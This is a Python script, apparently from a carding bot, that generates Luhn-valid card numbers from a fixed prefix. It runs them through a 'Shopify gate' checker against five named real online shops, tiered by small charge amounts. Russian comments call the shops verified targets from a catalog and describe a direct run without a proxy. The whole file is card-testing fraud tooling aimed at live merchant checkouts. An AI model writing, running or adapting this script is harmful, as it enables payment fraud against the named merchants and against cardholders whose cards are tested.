import asyncio
import os
import sys
import random
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import gate_client as gc
import shopify_gate as sg
from bot.gates import shopify as bg_shopify

def gen_test_card():
    prefix = "379363037"
    rand = "".join(str(random.randint(0, 9)) for _ in range(5))
    partial = prefix + rand
    check = gc.luhn_check_digit(partial)
    return partial + str(check)

async def check_direct(target: str, card: str, max_price: int = 2000):
    raw_card = f"{card}|12|2030|1234"
    t0 = time.time()
    try:
        # direct: proxy=None
        res = await sg.check_target(target, raw_card, proxy=None, max_price_cents=max_price)
    except Exception as e:
        res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}", "amount_cents": 0, "currency": "USD"}
    dur = round(time.time() - t0, 2)
    return res, dur

async def main():
    print("=== LIVE PROBE: 5 DIFFERENT SHOPIFY TARGETS (DIRECT, NO PROXY) ===\n", flush=True)
    
    # 5 разных проверенных целей из каталога
    targets = [
        ("https://republicoftea.com", 100, "Tier 1 (< $1)"),
        ("https://farmhouseteas.com", 500, "Tier 5 ($1-$5)"),
        ("https://brooklyn-candle-studio.myshopify.com", 500, "Tier 5 ($1-$5)"),
        ("https://thebeancoffeecompany.com", 2000, "Tier 20 ($5-$20)"),
        ("https://communitycoffee.com", 500, "Tier 5 ($1-$5)"),
    ]
    
    results = []
    for idx, (target, max_cents, desc) in enumerate(targets, 1):
        card = gen_test_card()
        masked = gc.mask_pan(card)
        print(f"[{idx}/5] {target} ({desc}) | Card: {masked} ...", flush=True)
        
        res, dur = await check_direct(target, card, max_price=max_cents)
        
        status = res.get("status")
        detail = str(res.get("detail", ""))[:120]
        amt = res.get("amount_cents", 0)
        curr = res.get("currency", "USD")
        
        print(f"       -> Verdict: {status} | [{amt}c {curr}] {detail} ({dur}s)", flush=True)
        results.append((target, desc, status, amt, curr, detail, dur))
        await asyncio.sleep(1.0)
        
    print("\n" + "="*75, flush=True)
    print("ИТОГ ПРОГОНА 5 МАГАЗИНОВ DIRECT (БЕЗ ПРОКСИ):", flush=True)
    for t, d, st, amt, curr, det, dur in results:
        print(f"  * {t:45} | {st:8} | [{amt}c {curr}] {dur}s | {det[:45]}")

if __name__ == "__main__":
    asyncio.run(main())
